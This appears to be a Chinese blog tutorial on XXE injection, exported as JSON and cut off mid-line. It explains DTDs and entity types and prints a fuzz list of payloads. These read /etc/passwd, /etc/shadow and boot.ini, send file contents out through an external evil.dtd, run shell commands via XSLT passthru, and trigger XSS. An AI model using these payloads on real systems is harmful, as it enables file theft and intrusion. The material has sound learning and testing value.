xmlns:xss><?import namespace=\"xss\" implementation=\"http://ha.ckers.org/xss.htc\">\n<xsl:stylesheet version=\"1.0\" xmlns:xsl=\"http://www.w3.org/1999/XSL/Transform\" xmlns:php=\"http://php.net/xsl\"><xsl:template match=\"/\"><script>alert(123)</script></xsl:template></xsl:stylesheet>\n<xsl:stylesheet version=\"1.0\" xmlns:xsl=\"http://www.w3.org/1999/XSL/Transform\" xmlns:php=\"http://php.net/xsl\"><xsl:template match=\"/\"><xsl:copy-of select=\"document('/etc/passwd')\"/></xsl:template></xsl:stylesheet>\n<xsl:stylesheet version=\"1.0\" xmlns:xsl=\"http://www.w3.org/1999/XSL/Transform\" xmlns:php=\"http://php.net/xsl\"><xsl:template match=\"/\"><xsl:value-of select=\"php:function('passthru','ls -la')\"/></xsl:template></xsl:stylesheet>\n<!DOCTYPE foo [<!ELEMENT foo ANY ><!ENTITY xxe SYSTEM \"file:///etc/passwd\" >]>\n<!DOCTYPE foo [<!ELEMENT foo ANY ><!ENTITY xxe SYSTEM \"file:///etc/shadow\" >]>\n<!DOCTYPE foo [<!ELEMENT foo ANY ><!ENTITY xxe SYSTEM \"file:///c:/boot.ini\" >]>\n<!DOCTYPE foo [<!ELEMENT foo ANY ><!ENTITY xxe SYSTEM \"http://example.com/text.txt\" >]>\n<!DOCTYPE foo [<!ELEMENT foo ANY><!ENTITY xxe SYSTEM \"file:////dev/random\">]>\n<!ENTITY % int \"<!ENTITY &#37; trick SYSTEM 'http://127.0.0.1:80/?%file;'>  \"> %int;\n<!DOCTYPE xxe [ <!ENTITY % file SYSTEM \"file:///etc/issue\"><!ENTITY % dtd SYSTEM \"http://example.com/evil.dtd\">%dtd;%trick;]>\n<!DOCTYPE xxe [ <!ENTITY % file SYSTEM \"file:///c:/boot.ini\"><!ENTITY % dtd SYSTEM \"http://example.com/evil.dtd\">%dtd;%trick;]>\n```\n\n","slug":"xxe","published":1,"updated":"2022-01-10T08:13:17.381Z","comments":1,"layout":"post","photos":[],"link":"","_id":"ckyiip9na0022gsw9as3c968w","content":"<h2 id=\"xxe\"><a href=\"#xxe\" class=\"headerlink\" title=\"xxe\"></a>xxe</h2><p>xxe全程XML External Entity Injection即xml外部实体注入漏洞,XXE漏洞发生在<strong>应用程序解析XML输入时,没有禁止外部实体的加载</strong>,导致可能加载恶意外部文件,造成文件读取,命令执行,内网探测…</p>\n<h4 id=\"DTD\"><a href=\"#DTD\" class=\"headerlink\" title=\"DTD\"></a>DTD</h4><p>Document Type Definition 文档类型定义</p>\n<h5 id=\"DTD示例\"><a href=\"#DTD示例\" class=\"headerlink\" title=\"DTD示例\"></a>DTD示例</h5><p><code>&lt;!ELEMENT 元素名 类型&gt;</code></p>\n<p>文件名xxe.dtd</p>\n<p>ELEMENT大概作用是定义标签元素的类型</p>\n<figure class=\"highlight plaintext\"><table><tr><td class=\"gutter\"><pre><span class=\"line\">1</span><br><span class=\"line\">2</span><br><span class=\"line\">3</span><br><span class=\"line\">4</span><br><span class=\"line\">5</span><br></pre></td><td class=\"code\"><pre><span class=\"line\">&lt;!ELEMENT 班级 (学生+)&gt;</span><br><span class=\"line\">&lt;!ELEMENT 学生 (名字,年龄,介绍)&gt;</span><br><span class=\"line\">&lt;!ELEMENT 名字 (#PCDATA)&gt;</span><br><span class=\"line\">&lt;!ELEMENT 年龄 (#PCDATA)&gt;</span><br><span class=\"line\">&lt;!ELEMENT 介绍 (#PCDATA)&gt;</span><br></pre></td></tr></table></figure>\n\n<h5 id=\"PCDATA\"><a href=\"#PCDATA\" class=\"headerlink\" title=\"PCDATA\"></a>PCDATA</h5><p>PCDATA 的意思是被解析的字符数据（parsed character data）。<br>PCDATA 是会被解析器解析的文本。这些文本将被解析器检查实体以及标记。</p>\n<h5 id=\"CDATA\"><a href=\"#CDATA\" class=\"headerlink\" title=\"CDATA\"></a>CDATA</h5><p>CDATA 的意思是字符数据（character data）。<br>CDATA 是不会被解析器解析的文本。</p>\n<h5 id=\"XML示例\"><a href=\"#XML示例\" class=\"headerlink\" title=\"XML示例\"></a>XML示例</h5><p>班级为根元素</p>\n<figure class=\"highlight xml\"><table><tr><td class=\"gutter\"><pre><span class=\"line\">1</span><br><span class=\"line\">2</span><br><span class=\"line\">3</span><br><span class=\"line\">4</span><br><span class=\"line\">5</span><br><span class=\"line\">6</span><br><span class=\"line\">7</span><br><span class=\"line\">8</span><br><span class=\"line\">9</span><br><span class=\"line\">10</span><br><span class=\"line\">11</span><br><span class=\"line\">12</span><br><span class=\"line\">13</span><br><span class=\"line\">14</span><br></pre></td><td class=\"code\"><pre><span class=\"line\"><span class=\"meta\">&lt;?xml version=&quot;1.0&quot; encoding=&quot;UTF-8&quot; standalone=&quot;yes&quot;?&gt;</span></span><br><span class=\"line\"><span class=\"meta\">&lt;!DOCTYPE 班级 <span class=\"meta-keyword\">SYSTEM</span> <span class=\"meta-string\">&quot;xxe.dtd&quot;</span>&gt;</span></span><br><span class=\"line\">&lt;班级&gt;</span><br><span class=\"line\">\t&lt;学生&gt;</span><br><span class=\"line\">        &lt;名字&gt;张三&lt;/名字&gt;</span><br><span class=\"line\">        &lt;年龄&gt;19&lt;/年龄&gt;</span><br><span class=\"line\">        &lt;介绍&gt;好孩子&lt;/介绍&gt;</span><br><span class=\"line\">    &lt;/学生&gt;</span><br><span class=\"line\">    &lt;学生&gt;</span><br><span class=\"line\">        &lt;名字&gt;小明&lt;/名字&gt;</span><br><span class=\"line\">        &lt;年龄&gt;21&lt;/年龄&gt;</span><br><span class=\"line\">        &lt;介绍&gt;学习认真&lt;/介绍&gt;</span><br><span class=\"line\">    &lt;/学生&gt;</span><br><span class=\"line\">&lt;/班级&gt;</span><br></pre></td></tr></table></figure>\n\n<p>内部DTD</p>\n<figure class=\"highlight xml\"><table><tr><td class=\"gutter\"><pre><span class=\"line\">1</span><br><span class=\"line\">2</span><br><span class=\"line\">3</span><br><span class=\"line\">4</span><br><span class=\"line\">5</span><br><span class=\"line\">6</span><br><span class=\"line\">7</span><br><span class=\"line\">8</span><br><span class=\"line\">9</span><br><span class=\"line\">10</span><br><span class=\"line\">11</span><br><span class=\"line\">12</span><br><span class=\"line\">13</span><br><span class=\"line\">14</span><br><span class=\"line\">15</span><br><span class=\"line\">16</span><br><span class=\"line\">17</span><br><span class=\"line\">18</span><br><span class=\"line\">19</span><br><span class=\"line\">20</span><br></pre></td><td class=\"code\"><pre><span class=\"line\"><span class=\"meta\">&lt;?xml version=&quot;1.0&quot; encoding=&quot;UTF-8&quot; standalone=&quot;yes&quot;?&gt;</span></span><br><span class=\"line\"><span class=\"meta\">&lt;!DOCTYPE 班级 [</span></span><br><span class=\"line\"><span class=\"meta\"><span class=\"meta\">&lt;!ELEMENT 班级 (学生+)&gt;</span></span></span><br><span class=\"line\"><span class=\"meta\"><span class=\"meta\">&lt;!ELEMENT 学生 (名字,年龄,介绍)&gt;</span></span></span><br><span class=\"line\"><span class=\"meta\"><span class=\"meta\">&lt;!ELEMENT 名字 (<span class=\"meta-keyword\">#PCDATA</span>)&gt;</span></span></span><br><span class=\"line\"><span class=\"meta\"><span class=\"meta\">&lt;!ELEMENT 年龄 (<span class=\"meta-keyword\">#PCDATA</span>)&gt;</span></span></span><br><span class=\"line\"><span class=\"meta\"><span class=\"meta\">&lt;!ELEMENT 介绍 (<span class=\"meta-keyword\">#PCDATA</span>)&gt;</span></span></span><br><span class=\"line\"><span class=\"meta\">]&gt;</span></span><br><span class=\"line\">&lt;班级&gt;</span><br><span class=\"line\">\t&lt;学生&gt;</span><br><span class=\"line\">        &lt;名字&gt;张三&lt;/名字&gt;</span><br><span class=\"line\">        &lt;年龄&gt;19&lt;/年龄&gt;</span><br><span class=\"line\">        &lt;介绍&gt;好孩子&lt;/介绍&gt;</span><br><span class=\"line\">    &lt;/学生&gt;</span><br><span class=\"line\">    &lt;学生&gt;</span><br><span class=\"line\">        &lt;名字&gt;小明&lt;/名字&gt;</span><br><span class=\"line\">        &lt;年龄&gt;21&lt;/年龄&gt;</span><br><span class=\"line\">        &lt;介绍&gt;学习认真&lt;/介绍&gt;</span><br><span class=\"line\">    &lt;/学生&gt;</span><br><span class=\"line\">&lt;/班级&gt;</span><br></pre></td></tr></table></figure>\n\n\n\n<h4 id=\"具体操作\"><a href=\"#具体操作\" class=\"headerlink\" title=\"具体操作\"></a>具体操作</h4><h5 id=\"内部实体\"><a href=\"#内部实体\" class=\"headerlink\" title=\"内部实体\"></a>内部实体</h5><figure class=\"highlight xml\"><table><tr><td class=\"gutter\"><pre><span class=\"line\">1</span><br><span class=\"line\">2</span><br><span class=\"line\">3</span><br><span class=\"line\">4</span><br><span class=\"line\">5</span><br><span class=\"line\">6</span><br></pre></td><td class=\"code\"><pre><span class=\"line\"><span class=\"meta\">&lt;?xml version=&quot;1.0&quot; encoding=&quot;UTF-8&quot; standalone=&quot;yes&quot;?&gt;</span></span><br><span class=\"line\"><span class=\"meta\">&lt;!DOCTYPE <span class=\"meta-keyword\">neo</span>[</span></span><br><span class=\"line\"><span class=\"meta\">\t<span class=\"meta\">&lt;!ELEMENT <span class=\"meta-keyword\">neo</span> <span class=\"meta-keyword\">ANY</span>&gt;</span></span></span><br><span class=\"line\"><span class=\"meta\">\t<span class=\"meta\">&lt;!ENTITY <span class=\"meta-keyword\">xxe</span> <span class=\"meta-string\">&quot;hello&quot;</span>&gt;</span></span></span><br><span class=\"line\"><span class=\"meta\">]&gt;</span></span><br><span class=\"line\"><span class=\"tag\">&lt;<span class=\"name\">neo</span>&gt;</span><span class=\"symbol\">&amp;xxe;</span><span class=\"tag\">&lt;/<span class=\"name\">neo</span>&gt;</span></span><br></pre></td></tr></table></figure>\n\n<p>会在页面回显hello</p>\n<h5 id=\"外部实体\"><a href=\"#外部实体\" class=\"headerlink\" title=\"外部实体\"></a>外部实体</h5><figure class=\"highlight xml\"><table><tr><td class=\"gutter\"><pre><span class=\"line\">1</span><br><span class=\"line\">2</span><br><span class=\"line\">3</span><br><span class=\"line\">4</span><br><span class=\"line\">5</span><br><span class=\"line\">6</span><br></pre></td><td class=\"code\"><pre><span class=\"line\"><span class=\"meta\">&lt;?xml version=&quot;1.0&quot; encoding=&quot;UTF-8&quot; standalone=&quot;yes&quot;?&gt;</span></span><br><span class=\"line\"><span class=\"meta\">&lt;!DOCTYPE <span class=\"meta-keyword\">neo</span>[</span></span><br><span class=\"line\"><span class=\"meta\">\t<span class=\"meta\">&lt;!ELEMENT <span class=\"meta-keyword\">neo</span> <span class=\"meta-keyword\">ANY</span>&gt;</span></span></span><br><span class=\"line\"><span class=\"meta\">\t<span class=\"meta\">&lt;!ENTITY <span class=\"meta-keyword\">xxe</span> <span class=\"meta-keyword\">SYSTEM</span> <span class=\"meta-string\">&quot;文档URL&quot;</span>&gt;</span></span></span><br><span class=\"line\"><span class=\"meta\">]&gt;</span></span><br><span class=\"line\"><span class=\"tag\">&lt;<span class=\"name\">neo</span>&gt;</span><span class=\"symbol\">&amp;xxe;</span><span class=\"tag\">&lt;/<span class=\"name\">neo</span>&gt;</span></span><br></pre></td></tr></table></figure>\n\n<h5 id=\"参数实体\"><a href=\"#参数实体\" class=\"headerlink\" title=\"参数实体\"></a>参数实体</h5><p>参数实体只能在DTD文档中定义,DTD中引用</p>\n<figure class=\"highlight xml\"><table><tr><td class=\"gutter\"><pre><span class=\"line\">1</span><br><span class=\"line\">2</span><br><span class=\"line\">3</span><br><span class=\"line\">4</span><br><span class=\"line\">5</span><br><span class=\"line\">6</span><br><span class=\"line\">7</span><br><span class=\"line\">8</span><br></pre></td><td class=\"code\"><pre><span class=\"line\"><span class=\"meta\">&lt;?xml version=&quot;1.0&quot; encoding=&quot;UTF-8&quot; standalone=&quot;yes&quot;?&gt;</span></span><br><span class=\"line\"><span class=\"meta\">&lt;!DOCTYPE <span class=\"meta-keyword\">neo</span>[</span></span><br><span class=\"line\"><span class=\"meta\">\t<span class=\"meta\">&lt;!ELEMENT <span class=\"meta-keyword\">neo</span> <span class=\"meta-keyword\">ANY</span>&gt;</span></span></span><br><span class=\"line\"><span class=\"meta\">\t<span class=\"meta\">&lt;!ENTITY % <span class=\"meta-keyword\">xxe</span> <span class=\"meta-keyword\">SYSTEM</span> <span class=\"meta-string\">&quot;http://xxx.xxx.xxx/evil.dtd&quot;</span>&gt;</span></span></span><br><span class=\"line\"><span class=\"meta\">\t%xxe;</span></span><br><span class=\"line\"><span class=\"meta\"></span></span><br><span class=\"line\"><span class=\"meta\">]&gt;</span></span><br><span class=\"line\"><span class=\"tag\">&lt;<span class=\"name\">neo</span>&gt;</span><span class=\"symbol\">&amp;evil;</span><span class=\"tag\">&lt;/<span class=\"name\">neo</span>&gt;</span></span><br></pre></td></tr></table></figure>\n\n<h4 id=\"攻击方式\"><a href=\"#攻击方式\" class=\"headerlink\" title=\"攻击方式\"></a>攻击方式</h4><h5 id=\"直接通过DTD外部实体声明\"><a href=\"#直接通过DTD外部实体声明\" class=\"headerlink\" title=\"直接通过DTD外部实体声明\"></a>直接通过DTD外部实体声明</h5><figure class=\"highlight xml\"><table><tr><td class=\"gutter\"><pre><span class=\"line\">1</span><br><span class=\"line\">2</span><br><span class=\"line\">3</span><br><span class=\"line\">4</span><br><span class=\"line\">5</span><br></pre></td><td class=\"code\"><pre><span class=\"line\"><span class=\"meta\">&lt;?xml version=&quot;1.0&quot; encoding=&quot;UTF-8&quot; standalone=&quot;yes&quot;?&gt;</span></span><br><span class=\"line\"><span class=\"meta\">&lt;!DOCTYPE <span class=\"meta-keyword\">neo</span>[</span></span><br><span class=\"line\"><span class=\"meta\">\t<span class=\"meta\">&lt;!ENTITY <span class=\"meta-keyword\">xxe</span> <span class=\"meta-keyword\">SYSTEM</span> <span class=\"meta-string\">&quot;file:///etc/passwd&quot;</span>&gt;</span></span></span><br><span class=\"line\"><span class=\"meta\">]&gt;</span></span><br><span class=\"line\"><span class=\"tag\">&lt;<span class=\"name\">c</span>&gt;</span><span class=\"symbol\">&amp;xxe;</span><span class=\"tag\">&lt;/<span class=\"name\">c</span>&gt;</span></span><br></pre></td></tr></table></figure>\n\n<h5 id=\"通过DTD文档引入外部DTD文档-再引入外部实体声明\"><a href=\"#通过DTD文档引入外部DTD文档-再引入外部实体声明\" class=\"headerlink\" title=\"通过DTD文档引入外部DTD文档,再引入外部实体声明\"></a>通过DTD文档引入外部DTD文档,再引入外部实体声明</h5><p>xml内容</p>\n<figure class=\"highlight xml\"><table><tr><td class=\"gutter\"><pre><span class=\"line\">1</span><br><span class=\"line\">2</span><br><span class=\"line\">3</span><br></pre></td><td class=\"code\"><pre><span class=\"line\"><span class=\"meta\">&lt;?xml version=&quot;1.0&quot;?&gt;</span></span><br><span class=\"line\"><span class=\"meta\">&lt;!DOCTYPE <span class=\"meta-keyword\">neo</span> <span class=\"meta-keyword\">SYSTEM</span> <span class=\"meta-string\">&quot;dtd文档url&quot;</span>&gt;</span></span><br><span class=\"line\"><span class=\"tag\">&lt;<span class=\"name\">c</span>&gt;</span><span class=\"symbol\">&amp;xxe;</span><span class=\"tag\">&lt;/<span class=\"name\">c</span>&gt;</span></span><br></pre></td></tr></table></figure>\n\n<p>dtd内容</p>\n<figure class=\"highlight plaintext\"><table><tr><td class=\"gutter\"><pre><span class=\"line\">1</span><br></pre></td><td class=\"code\"><pre><span class=\"line\">&lt;!ENTITY xxe SYSTEM &quot;file:///etc/passwd&quot;&gt;</span><br></pre></td></tr></table></figure>\n\n<h5 id=\"通过参数实体-OOB\"><a href=\"#通过参数实体-OOB\" class=\"headerlink\" title=\"通过参数实体(OOB)\"></a>通过参数实体(OOB)</h5><p>先写一个外部实体声明,然后引用在攻击者服务器上面的外部实体声明</p>\n<p>xml内容</p>\n<h5 id=\"作用\"><a href=\"#作用\" class=\"headerlink\" title=\"%作用\"></a>%作用</h5><p>就我的理解,百分号可以类比于一段命令,它可以在dtd中被定义和执行,它在实例中相当于变量,在xml中相当于命令?</p>\n<figure class=\"highlight xml\"><table><tr><td class=\"gutter\"><pre><span class=\"line\">1</span><br><span class=\"line\">2</span><br><span class=\"line\">3</span><br><span class=\"line\">4</span><br><span class=\"line\">5</span><br><span class=\"line\">6</span><br></pre></td><td class=\"code\"><pre><span class=\"line\"><span class=\"meta\">&lt;?xml version=&quot;1.0&quot;?&gt;</span></span><br><span class=\"line\"><span class=\"meta\">&lt;!DOCTYPE a [</span></span><br><span class=\"line\"><span class=\"meta\">\t<span class=\"meta\">&lt;!ENTITY %d <span class=\"meta-keyword\">SYSTEM</span> <span class=\"meta-string\">&quot;http://xxx.xxx/evil.dtd&quot;</span>&gt;</span></span></span><br><span class=\"line\"><span class=\"meta\">\t%d;</span></span><br><span class=\"line\"><span class=\"meta\">]&gt;</span></span><br><span class=\"line\"><span class=\"tag\">&lt;<span class=\"name\">c</span>&gt;</span><span class=\"symbol\">&amp;b;</span><span class=\"tag\">&lt;/<span class=\"name\">c</span>&gt;</span></span><br></pre></td></tr></table></figure>\n\n<p>dtd文件内容</p>\n<figure class=\"highlight plaintext\"><table><tr><td class=\"gutter\"><pre><span class=\"line\">1</span><br></pre></td><td class=\"code\"><pre><span class=\"line\">&lt;!ENTITY b SYSTEM &quot;file:///etc/passwd&quot;&gt;</span><br></pre></td></tr></table></figure>\n\n<h4 id=\"协议支持\"><a href=\"#协议支持\" class=\"headerlink\" title=\"协议支持\"></a>协议支持</h4><p><img src=\"https://gitee.com/blue_satchel/images/raw/master/image-20220108211411539.png\" alt=\"image-20220108211411539\"></p>\n<h5 id=\"XInclude-命名空间\"><a href=\"#XInclude-命名空间\" class=\"headerlink\" title=\"XInclude(命名空间)\"></a>XInclude(命名空间)</h5><p>导入外部xml文档，类似于php的include，将外部定义的dtd引入当前文件，因为引入外部实体具有局限性，所以使用xinclude来引入</p>\n<p> 本质是使用<code>http://www.w3.org/2003/XInclude</code> 命名空间中的两个元素，即 include 和 fallback。常用的命名空间前缀是“xi”（但可以根据喜好自由使用任何前缀）</p>\n<p>首先使用xmls来定义命名空间为xi</p>\n<p>然后接下来就可以使用定义好的xi命名空间中的include来包含文件了,parse可以将文件属性进行转换,转换成text进行包含输出</p>\n<p>一个例子</p>\n<figure class=\"highlight xml\"><table><tr><td class=\"gutter\"><pre><span class=\"line\">1</span><br><span class=\"line\">2</span><br><span class=\"line\">3</span><br></pre></td><td class=\"code\"><pre><span class=\"line\"><span class=\"tag\">&lt;<span class=\"name\">foo</span> <span class=\"attr\">xmlns:xi</span>=<span class=\"string\">&quot;http://www.we.org/2003/XInclude&quot;</span>&gt;</span></span><br><span class=\"line\">    <span class=\"tag\">&lt;<span class=\"name\">xi:include</span> <span class=\"attr\">parse</span>=<span class=\"string\">&quot;text&quot;</span> <span class=\"attr\">href</span>=<span class=\"string\">&quot;file:///etc/passwd&quot;</span>/&gt;</span>//    单标签别忘了反斜杠</span><br><span class=\"line\"><span class=\"tag\">&lt;/<span class=\"name\">foo</span>&gt;</span></span><br></pre></td></tr></table></figure>\n\n<h5 id=\"SVG-矢量图\"><a href=\"#SVG-矢量图\" class=\"headerlink\" title=\"SVG(矢量图)\"></a>SVG(矢量图)</h5><p>使用Apache中的Batik库解析矢量图,可以解析xml文档</p>\n<p><img src=\"https://gitee.com/blue_satchel/images/raw/master/image-20220109171338198.png\" alt=\"image-20220109171338198\"></p>\n<h5 id=\"对大佬写的xxe-fuzz的阅读理解\"><a href=\"#对大佬写的xxe-fuzz的阅读理解\" class=\"headerlink\" title=\"对大佬写的xxe fuzz的阅读理解\"></a>对大佬写的xxe fuzz的阅读理解</h5><figure class=\"highlight xml\"><table><tr><td class=\"gutter\"><pre><span class=\"line\">1</span><br><span class=\"line\">2</span><br><span class=\"line\">3</span><br><span class=\"line\">4</span><br><span class=\"line\">5</span><br><span class=\"line\">6</span><br><span class=\"line\">7</span><br><span class=\"line\">8</span><br><span class=\"line\">9</span><br><span class=\"line\">10</span><br><span class=\"line\">11</span><br><span class=\"line\">12</span><br><span class=\"line\">13</span><br><span class=\"line\">14</span><br><span class=\"line\">15</span><br><span class=\"line\">16</span><br><span class=\"line\">17</span><br><span class=\"line\">18</span><br><span class=\"line\">19</span><br><span class=\"line\">20</span><br><span class=\"line\">21</span><br><span class=\"line\">22</span><br><span class=\"line\">23</span><br><span class=\"line\">24</span><br><span class=\"line\">25</span><br><span class=\"line\">26</span><br><span class=\"line\">27</span><br><span class=\"line\">28</span><br><span class=\"line\">29</span><br><span class=\"line\">30</span><br><span class=\"line\">31</span><br><span class=\"line\">32</span><br><span class=\"line\">33</span><br><span class=\"line\">34</span><br><span class=\"line\">35</span><br><span class=\"line\">36</span><br><span class=\"line\">37</span><br><span class=\"line\">38</span><br><span class=\"line\">39</span><br><span class=\"line\">40</span><br><span class=\"line\">41</span><br><span class=\"line\">42</span><br><span class=\"line\">43</span><br><span class=\"line\">44</span><br><span class=\"line\">45</span><br><span class=\"line\">46</span><br><span class=\"line\">47</span><br><span class=\"line\">48</span><br></pre></td><td class=\"code\"><pre><span class=\"line\"><span class=\"meta\">&lt;?xml version=&quot;1.0&quot; encoding=&quot;ISO-8859-1&quot;?&gt;</span></span><br><span class=\"line\"><span class=\"meta\">&lt;!DOCTYPE <span class=\"meta-keyword\">xxe</span> [<span class=\"meta\">&lt;!ENTITY <span class=\"meta-keyword\">foo</span> <span class=\"meta-string\">&quot;aaaaaa&quot;</span>&gt;</span>]&gt;</span></span><br><span class=\"line\"><span class=\"meta\">&lt;!DOCTYPE <span class=\"meta-keyword\">xxe</span> [<span class=\"meta\">&lt;!ENTITY <span class=\"meta-keyword\">foo</span> <span class=\"meta-string\">&quot;aaaaaa&quot;</span>&gt;</span>]&gt;</span><span class=\"tag\">&lt;<span class=\"name\">root</span>&gt;</span><span class=\"symbol\">&amp;foo;</span><span class=\"tag\">&lt;/<span class=\"name\">root</span>&gt;</span></span><br><span class=\"line\"><span class=\"meta\">&lt;?xml version=&quot;1.0&quot; encoding=&quot;ISO-8859-1&quot;?&gt;</span><span class=\"meta\">&lt;!DOCTYPE <span class=\"meta-keyword\">xxe</span> [<span class=\"meta\">&lt;!ENTITY <span class=\"meta-keyword\">foo</span> <span class=\"meta-string\">&quot;aaaaaa&quot;</span>&gt;</span>]&gt;</span></span><br><span class=\"line\"><span class=\"meta\">&lt;?xml version=&quot;1.0&quot; encoding=&quot;ISO-8859-1&quot;?&gt;</span><span class=\"meta\">&lt;!DOCTYPE <span class=\"meta-keyword\">xxe</span> [<span class=\"meta\">&lt;!ENTITY <span class=\"meta-keyword\">foo</span> <span class=\"meta-string\">&quot;aaaaaa&quot;</span>&gt;</span>]&gt;</span><span class=\"tag\">&lt;<span class=\"name\">root</span>&gt;</span><span class=\"symbol\">&amp;foo;</span><span class=\"tag\">&lt;/<span class=\"name\">root</span>&gt;</span></span><br><span class=\"line\"><span class=\"meta\">&lt;?xml version=&quot;1.0&quot; encoding=&quot;ISO-8859-1&quot;?&gt;</span><span class=\"tag\">&lt;<span class=\"name\">test</span>&gt;</span><span class=\"tag\">&lt;/<span class=\"name\">test</span>&gt;</span></span><br><span class=\"line\"><span class=\"meta\">&lt;?xml version=&quot;1.0&quot; encoding=&quot;ISO-8859-1&quot;?&gt;</span><span class=\"meta\">&lt;!DOCTYPE <span class=\"meta-keyword\">foo</span> [<span class=\"meta\">&lt;!ELEMENT <span class=\"meta-keyword\">foo</span> <span class=\"meta-keyword\">ANY</span> &gt;</span><span class=\"meta\">&lt;!ENTITY <span class=\"meta-keyword\">xxe</span> <span class=\"meta-keyword\">SYSTEM</span> <span class=\"meta-string\">&quot;file:///etc/passwd&quot;</span> &gt;</span>]&gt;</span><span class=\"tag\">&lt;<span class=\"name\">foo</span>&gt;</span><span class=\"symbol\">&amp;xxe;</span><span class=\"tag\">&lt;/<span class=\"name\">foo</span>&gt;</span></span><br><span class=\"line\"><span class=\"meta\">&lt;?xml version=&quot;1.0&quot; encoding=&quot;ISO-8859-1&quot;?&gt;</span><span class=\"meta\">&lt;!DOCTYPE <span class=\"meta-keyword\">foo</span> [<span class=\"meta\">&lt;!ELEMENT <span class=\"meta-keyword\">foo</span> <span class=\"meta-keyword\">ANY</span> &gt;</span><span class=\"meta\">&lt;!ENTITY <span class=\"meta-keyword\">xxe</span> <span class=\"meta-keyword\">SYSTEM</span> <span class=\"meta-string\">&quot;file:///etc/passwd&quot;</span> &gt;</span>]&gt;</span></span><br><span class=\"line\"><span class=\"meta\">&lt;?xml version=&quot;1.0&quot; encoding=&quot;ISO-8859-1&quot;?&gt;</span><span class=\"meta\">&lt;!DOCTYPE <span class=\"meta-keyword\">foo</span> [<span class=\"meta\">&lt;!ELEMENT <span class=\"meta-keyword\">foo</span> <span class=\"meta-keyword\">ANY</span> &gt;</span><span class=\"meta\">&lt;!ENTITY <span class=\"meta-keyword\">xxe</span> <span class=\"meta-keyword\">SYSTEM</span> <span class=\"meta-string\">&quot;file:///etc/issue&quot;</span> &gt;</span>]&gt;</span><span class=\"tag\">&lt;<span class=\"name\">foo</span>&gt;</span><span class=\"symbol\">&amp;xxe;</span><span class=\"tag\">&lt;/<span class=\"name\">foo</span>&gt;</span></span><br><span class=\"line\"><span class=\"meta\">&lt;?xml version=&quot;1.0&quot; encoding=&quot;ISO-8859-1&quot;?&gt;</span><span class=\"meta\">&lt;!DOCTYPE <span class=\"meta-keyword\">foo</span> [<span class=\"meta\">&lt;!ELEMENT <span class=\"meta-keyword\">foo</span> <span class=\"meta-keyword\">ANY</span> &gt;</span><span class=\"meta\">&lt;!ENTITY <span class=\"meta-keyword\">xxe</span> <span class=\"meta-keyword\">SYSTEM</span> <span class=\"meta-string\">&quot;file:///etc/issue&quot;</span> &gt;</span>]&gt;</span></span><br><span class=\"line\"><span class=\"meta\">&lt;?xml version=&quot;1.0&quot; encoding=&quot;ISO-8859-1&quot;?&gt;</span><span class=\"meta\">&lt;!DOCTYPE <span class=\"meta-keyword\">foo</span> [<span class=\"meta\">&lt;!ELEMENT <span class=\"meta-keyword\">foo</span> <span class=\"meta-keyword\">ANY</span> &gt;</span><span class=\"meta\">&lt;!ENTITY <span class=\"meta-keyword\">xxe</span> <span class=\"meta-keyword\">SYSTEM</span> <span class=\"meta-string\">&quot;file:///etc/shadow&quot;</span> &gt;</span>]&gt;</span><span class=\"tag\">&lt;<span class=\"name\">foo</span>&gt;</span><span class=\"symbol\">&amp;xxe;</span><span class=\"tag\">&lt;/<span class=\"name\">foo</span>&gt;</span></span><br><span class=\"line\"><span class=\"meta\">&lt;?xml version=&quot;1.0&quot; encoding=&quot;ISO-8859-1&quot;?&gt;</span><span class=\"meta\">&lt;!DOCTYPE <span class=\"meta-keyword\">foo</span> [<span class=\"meta\">&lt;!ELEMENT <span class=\"meta-keyword\">foo</span> <span class=\"meta-keyword\">ANY</span> &gt;</span><span class=\"meta\">&lt;!ENTITY <span class=\"meta-keyword\">xxe</span> <span class=\"meta-keyword\">SYSTEM</span> <span class=\"meta-string\">&quot;file:///etc/shadow&quot;</span> &gt;</span>]&gt;</span></span><br><span class=\"line\"><span class=\"meta\">&lt;?xml version=&quot;1.0&quot; encoding=&quot;ISO-8859-1&quot;?&gt;</span><span class=\"meta\">&lt;!DOCTYPE <span class=\"meta-keyword\">foo</span> [<span class=\"meta\">&lt;!ELEMENT <span class=\"meta-keyword\">foo</span> <span class=\"meta-keyword\">ANY</span> &gt;</span><span class=\"meta\">&lt;!ENTITY <span class=\"meta-keyword\">xxe</span> <span class=\"meta-keyword\">SYSTEM</span> <span class=\"meta-string\">&quot;file:///c:/boot.ini&quot;</span> &gt;</span>]&gt;</span><span class=\"tag\">&lt;<span class=\"name\">foo</span>&gt;</span><span class=\"symbol\">&amp;xxe;</span><span class=\"tag\">&lt;/<span class=\"name\">foo</span>&gt;</span></span><br><span class=\"line\"><span class=\"meta\">&lt;?xml version=&quot;1.0&quot; encoding=&quot;ISO-8859-1&quot;?&gt;</span><span class=\"meta\">&lt;!DOCTYPE <span class=\"meta-keyword\">foo</span> [<span class=\"meta\">&lt;!ELEMENT <span class=\"meta-keyword\">foo</span> <span class=\"meta-keyword\">ANY</span> &gt;</span><span class=\"meta\">&lt;!ENTITY <span class=\"meta-keyword\">xxe</span> <span class=\"meta-keyword\">SYSTEM</span> <span class=\"meta-string\">&quot;file:///c:/boot.ini&quot;</span> &gt;</span>]&gt;</span></span><br><span class=\"line\"><span class=\"meta\">&lt;?xml version=&quot;1.0&quot; encoding=&quot;ISO-8859-1&quot;?&gt;</span><span class=\"meta\">&lt;!DOCTYPE <span class=\"meta-keyword\">foo</span> [<span class=\"meta\">&lt;!ELEMENT <span class=\"meta-keyword\">foo</span> <span class=\"meta-keyword\">ANY</span> &gt;</span><span class=\"meta\">&lt;!ENTITY <span class=\"meta-keyword\">xxe</span> <span class=\"meta-keyword\">SYSTEM</span> <span class=\"meta-string\">&quot;http://example.com:80&quot;</span> &gt;</span>]&gt;</span><span class=\"tag\">&lt;<span class=\"name\">foo</span>&gt;</span><span class=\"symbol\">&amp;xxe;</span><span class=\"tag\">&lt;/<span class=\"name\">foo</span>&gt;</span></span><br><span class=\"line\"><span class=\"meta\">&lt;?xml version=&quot;1.0&quot; encoding=&quot;ISO-8859-1&quot;?&gt;</span><span class=\"meta\">&lt;!DOCTYPE <span class=\"meta-keyword\">foo</span> [<span class=\"meta\">&lt;!ELEMENT <span class=\"meta-keyword\">foo</span> <span class=\"meta-keyword\">ANY</span> &gt;</span><span class=\"meta\">&lt;!ENTITY <span class=\"meta-keyword\">xxe</span> <span class=\"meta-keyword\">SYSTEM</span> <span class=\"meta-string\">&quot;http://example:443&quot;</span> &gt;</span>]&gt;</span></span><br><span class=\"line\"><span class=\"meta\">&lt;?xml version=&quot;1.0&quot; 